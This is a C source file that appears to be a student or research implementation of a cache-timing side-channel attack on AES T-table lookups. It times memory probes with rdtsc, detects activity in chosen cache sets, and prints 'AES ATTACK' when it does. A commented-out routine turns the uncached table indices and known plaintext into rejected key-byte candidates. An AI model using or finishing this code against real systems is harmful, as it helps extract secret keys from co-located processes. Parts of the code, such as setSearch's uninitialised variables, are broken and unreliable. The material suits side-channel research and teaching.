#include<stdio.h>
#include<time.h>
#include<omp.h>
#include<math.h>
#include<stdlib.h>
#include<string.h>

static __inline__ unsigned long long rdtsc(void)
{
  unsigned long long int x;
     __asm__ volatile (".byte 0x0f, 0x31" : "=A" (x));
     return x;
}

//char T[4][8]={"4211008","4213056","4215104","4217152"};
//int plaintext[4]={0x28,0xFF,0x10,0x02};
int cachedset[4][4]={{266,265,288,270},{294,307,299,324},{344,327,327,340},{364,357,360, 376}};
//int uncachedIndices[4][256]={-1};
int cyc[4][4]={0};
//int rejectedKeyBits[4][256]={-1};
//int rejectedKeyBitsLength[4]={-1};
//int possibleKeySet[16][256]={-1};


/*void attack()
{
        int result;
	char buff[10];
	int set[4][256],i,j,k=0;
	//4 look up tables
	for(i=0;i<4;i++)
	{
		k=0;
		for(j=0;j<256;j++)
		{
			sprintf(buff,"%x",(atoi(T[i])+j*8));
			set[i][j]=setNumber(buff);
			result = setSearch(i,set[i][j]);
			if(!result)
			{
			        uncachedIndices[i][k]=j;
			        rejectedKeyBits[i][k]=uncachedIndices[i][k]^plaintext[i];
			        k++;
			}
		}
		rejectedKeyBitsLength[i]=k;
	}
	
	printf("\nset[i][j]\n");
	for(i=0;i<4;i++)
	{
		printf("table 1:");
		for(j=0;j<256;j++)	
		{
			printf("%d\t",set[i][j]);
		}
		printf("\n");
	}
	
	printf("\nRejected key bits length");
	for(i=0;i<4;i++)
		printf("%d\t",rejectedKeyBitsLength[i]);
	
	printf("\nUncached Indices\n");
	for(i=0;i<4;i++)		
	{
               for(j=0;j<rejectedKeyBitsLength[i];j++)
              {
		      printf("%d\t",uncachedIndices[i][j]);
	      }
	       printf("\n");
	}

	printf("\nRejected Key Bits\n");
	for(i=0;i<4;i++)                        
       {
               for(j=0;j<rejectedKeyBitsLength[i];j++)
               {       
                      printf("%d\t",rejectedKeyBits[i][j]);
                }
                printf("\n");
        }

	for(i=0;i<4;i++)
	{
		for(j=0;j<rejectedKeyBitsLength[i];j++)
		{
        		result=rejectedKeyBits[i][j];
		        possibleKeySet[i][result]=-1;
		}
	}

	printf("\nModified possible key set\n");
	for(i=0;i<16;i++)
	{
		for(j=0;j<256;j++)
		{
			printf("%d\t",possibleKeySet[i][j]);
		}
		printf("\n");
	}
}
*/
int main(int argc, char **argv)
{
	FILE *fp=fopen(argv[1],"w+");
        char a[4194305];
	char buff[100];
        int i,j,k,m,n,count,l,increment=0,h=0;
        double start,end;
	int flag=0;

//Generate all possible key values
	/*for(i=0;i<16;i++)
	{
		for(j=0;j<256;j++)
		{
		possibleKeySet[i][j]=j;
		}
	}*/

        //create and fill array
        for(i=0;i<4194305;i++)
                a[i]='a';

	while(1)
	{
		for(m=0;m<4;m++)
			for(n=0;n<4;n++)
				cyc[m][n]=0;

		for(l=0;l<4096;l++)
		{ 
		      i=l*64;
        	//to cover all 8 lines of set1
			
unsigned long long cycles = rdtsc();
	        	for(j=0;j<16;j++)
		        {  
			     count=0;
                //read cache line
	             		while(count<64)
          		      	{
                        		k=a[i];
	                        //to skip remaining sets
		                        count++;
                		        i++;
               			 }

	
		                increment=4095*64;
               			 i=i+increment;
      			}	
	 		cycles = rdtsc() - cycles;
 	
			if(cycles>8000)
			{
			//	printf("cycle greater than 8000= %d\t",l);
				for(m=0;m<4;m++)
				{
					for(n=0;n<4;n++)
					{
						if(l==cachedset[m][n])
							cyc[m][n]=1;

					}
				}
			}		
		}

		for(m=0;m<4;m++)
		{
			for(n=0;n<4;n++)
			{
				if(cyc[m][n]==1)
					flag=1;
				else 
				{
					flag=0;
					break;
				}
			}
			if(flag==0)
			break;
		}

		if(flag)
		{
			time_t now=time(NULL);
		        strftime(buff,100,"%H:%M:%S.000",localtime(&now));
			printf("\nAES ATTACK at %s\n",buff);
			flag=0;
//printf("\nBreaking");
		//	break;

		}
//printf("Waiting for attack");
	}
	printf("\nStarting attack :");
//	attack();
}

/*int setNumber(char hexaDecimal[7])
{
char binaryNumber[24],modifiedBinary[12],ch;
    int i,j,blen,len,temp;
    long int num,rem,set=0,power=0;
    
    len=strlen(hexaDecimal);
    blen=len*4;
    binaryNumber[blen]='\0';
    i=len;
    while(i>0)
    {
        i--;
        ch=hexaDecimal[i];
        if(ch>=48 && ch <=57)
            temp=ch-48;
        else
       {
               temp=ch-55;
        } 
        for(j=0;j<4;j++)
        {
             binaryNumber[--blen]=(temp%2)+48;
             temp/=2;
        }
     }
	for(i=6,j=0;i<18;i++,j++)
		modifiedBinary[j]=binaryNumber[i];
     modifiedBinary[12]='\0';
     num=atoi(modifiedBinary);
     
     for(i=0;i<12;i++)
     {
 		rem = num%10;
		 num = num/10;
 		set = set + rem * pow(2,power);
		 power++;
	}
return set;
 }

int setSearch(int tableNumber, int setNumber)
{
   int c, first, last, middle, n, search, array[100];
 
   first = 0;
   last = n - 1;
   middle = (first+last)/2;
 
   while( first <= last )
   {
      if ( cachedset[tableNumber][middle] < search )
         first = middle + 1;    
      else if ( cachedset[tableNumber][middle] == search ) 
      {
         return 1;
      }
      else
         last = middle - 1;
 
      middle = (first + last)/2;
   }
   return 0;   
}
*/
